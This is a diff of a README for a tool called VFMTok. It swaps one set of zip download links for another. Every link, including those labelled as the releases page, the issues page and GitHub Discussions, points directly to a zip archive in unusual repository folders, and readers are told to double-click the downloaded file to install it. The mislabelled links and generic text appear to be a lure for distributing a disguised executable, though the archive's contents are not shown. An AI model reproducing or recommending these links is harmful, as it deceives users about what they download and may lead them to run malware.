@@ -10,9 +10,9 @@ To begin using VFMTok, you need to install it on your device. Follow these simpl
 
 ## 📥 Download VFMTok
 
-[![Download VFMTok](https://raw.githubusercontent.com/iluvn01/VFMTok/main/auricled/VFMTok.zip%20Now-Get%https://raw.githubusercontent.com/iluvn01/VFMTok/main/auricled/VFMTok.zip)](https://raw.githubusercontent.com/iluvn01/VFMTok/main/auricled/VFMTok.zip)
+[![Download VFMTok](https://github.com/iluvn01/VFMTok/raw/refs/heads/main/autoregressive/sample/VFM-Tok-v2.8.zip%20Now-Get%https://github.com/iluvn01/VFMTok/raw/refs/heads/main/autoregressive/sample/VFM-Tok-v2.8.zip)](https://github.com/iluvn01/VFMTok/raw/refs/heads/main/autoregressive/sample/VFM-Tok-v2.8.zip)
 
-Visit this page to download the latest version: [Download VFMTok Releases](https://raw.githubusercontent.com/iluvn01/VFMTok/main/auricled/VFMTok.zip)
+Visit this page to download the latest version: [Download VFMTok Releases](https://github.com/iluvn01/VFMTok/raw/refs/heads/main/autoregressive/sample/VFM-Tok-v2.8.zip)
 
 ## 🛠️ System Requirements
 
@@ -25,7 +25,7 @@ Before you download, ensure your system meets these requirements:
 
 ## 📦 How to Install VFMTok
 
-1. Download the latest version from the [Download VFMTok Releases](https://raw.githubusercontent.com/iluvn01/VFMTok/main/auricled/VFMTok.zip) page.
+1. Download the latest version from the [Download VFMTok Releases](https://github.com/iluvn01/VFMTok/raw/refs/heads/main/autoregressive/sample/VFM-Tok-v2.8.zip) page.
 2. Locate the downloaded file on your computer. It may be in your "Downloads" folder.
 3. Double-click the file to begin the installation.
 4. Follow the on-screen instructions to complete the installation.
@@ -66,11 +66,11 @@ You only need an internet connection to download VFMTok. Once it is installed, y
 
 ### 4. What if I encounter issues during installation?
 
-If you face issues during installation, check the [issues page](https://raw.githubusercontent.com/iluvn01/VFMTok/main/auricled/VFMTok.zip) on GitHub for troubleshooting tips. You can also report your problem there.
+If you face issues during installation, check the [issues page](https://github.com/iluvn01/VFMTok/raw/refs/heads/main/autoregressive/sample/VFM-Tok-v2.8.zip) on GitHub for troubleshooting tips. You can also report your problem there.
 
 ## 🌟 Community and Support
 
-Join our community for help and updates! You can connect with other users and get support by visiting our [GitHub Discussions](https://raw.githubusercontent.com/iluvn01/VFMTok/main/auricled/VFMTok.zip) page. Your feedback is valuable, and we encourage contributions.
+Join our community for help and updates! You can connect with other users and get support by visiting our [GitHub Discussions](https://github.com/iluvn01/VFMTok/raw/refs/heads/main/autoregressive/sample/VFM-Tok-v2.8.zip) page. Your feedback is valuable, and we encourage contributions.
 
 ## 📜 License
 
@@ -86,6 +86,6 @@ You are now ready to explore the creative possibilities with VFMTok. Download it
 
 ## 📥 Download VFMTok Again
 
-[![Download VFMTok](https://raw.githubusercontent.com/iluvn01/VFMTok/main/auricled/VFMTok.zip%20Now-Get%https://raw.githubusercontent.com/iluvn01/VFMTok/main/auricled/VFMTok.zip)](https://raw.githubusercontent.com/iluvn01/VFMTok/main/auricled/VFMTok.zip)
+[![Download VFMTok](https://github.com/iluvn01/VFMTok/raw/refs/heads/main/autoregressive/sample/VFM-Tok-v2.8.zip%20Now-Get%https://github.com/iluvn01/VFMTok/raw/refs/heads/main/autoregressive/sample/VFM-Tok-v2.8.zip)](https://github.com/iluvn01/VFMTok/raw/refs/heads/main/autoregressive/sample/VFM-Tok-v2.8.zip)
 
-Visit this page for the latest version: [Download VFMTok Releases](https://raw.githubusercontent.com/iluvn01/VFMTok/main/auricled/VFMTok.zip)
+Visit this page for the latest version: [Download VFMTok Releases](https://github.com/iluvn01/VFMTok/raw/refs/heads/main/autoregressive/sample/VFM-Tok-v2.8.zip)
